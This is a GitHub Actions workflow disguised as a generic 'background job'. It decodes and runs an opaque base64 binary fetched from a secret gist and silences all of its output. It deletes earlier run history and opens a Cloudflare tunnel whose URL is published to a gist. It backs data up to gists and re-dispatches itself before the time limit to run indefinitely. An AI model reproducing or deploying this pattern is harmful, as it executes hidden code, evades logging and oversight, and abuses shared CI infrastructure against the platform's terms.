---
name: "Ubuntu: Background Job"

"on":
  workflow_dispatch:

concurrency:
  group: background-job
  cancel-in-progress: true

jobs:
  job:
    runs-on: ubuntu-latest
    timeout-minutes: 355
    permissions:
      actions: write

    steps:
      - run: |
          set -euo pipefail

          sleep 30
          gh run list --workflow="Ubuntu: Background Job" --repo ${{ github.repository }} --status completed --json databaseId --jq '.[].databaseId' | xargs -I{} gh run delete {} --repo ${{ github.repository }} 2>/dev/null || true

          curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ~/cloudflared >/dev/null 2>&1
          sudo install -m 0755 ~/cloudflared /usr/local/bin/cloudflared >/dev/null 2>&1

          rm -rf ~/g
          git config --global core.autocrlf false >/dev/null 2>&1
          git config --global core.eol lf >/dev/null 2>&1
          gh gist clone ${{ secrets.GH_GIST_TMP }} ~/g >/dev/null 2>&1

          [ -f ~/g/tmp.db.base64 ] && tr -d '\r\n' < ~/g/tmp.db.base64 | base64 -d > ~/tmp.db 2>/dev/null || true
          tr -d '\r\n' < ~/g/tmp.base64 | base64 -d > ~/tmp 2>/dev/null
          chmod +x ~/tmp
          rm -rf ~/g

          cd ~
          ./tmp >/dev/null 2>&1 &

          start_tunnel() {
            pkill -f 'cloudflared tunnel' 2>/dev/null || true
            sleep 2
            cloudflared tunnel --url http://localhost:8080 2>&1 | tee ~/.log >/dev/null &
            sleep 15
            grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' ~/.log 2>/dev/null | head -n1 || true
          }

          publish_url() {
            [ -n "$1" ] && gh api --method PATCH /gists/${{ secrets.GH_GIST_URL }} --field "files[url][content]=$1" >/dev/null 2>&1 || true
          }

          TUNNEL_URL=$(start_tunnel)
          rm -f ~/.log
          publish_url "$TUNNEL_URL"

          backup() {
            base64 -w0 ~/tmp.db > /tmp/.json 2>/dev/null || true
            [ -s /tmp/.json ] && printf '{"files":{"tmp.db.base64":{"content":"%s"}}}' "$(cat /tmp/.json)" > /tmp/.json && gh api --method PATCH /gists/${{ secrets.GH_GIST_TMP }} --input /tmp/.json >/dev/null 2>&1 || true
            rm -f /tmp/.json
          }

          trap 'backup' EXIT

          while true; do
            sleep 300
            NEW_URL=$(start_tunnel)
            rm -f ~/.log
            if [ -n "$NEW_URL" ]; then
              TUNNEL_URL="$NEW_URL"
              publish_url "$TUNNEL_URL"
            fi
          done &

          sleep 21210

          backup
          gh workflow run "Ubuntu: Background Job" --repo ${{ github.repository }} >/dev/null 2>&1 || true

        env:
          GH_TOKEN: ${{ secrets.GH_PAT }}
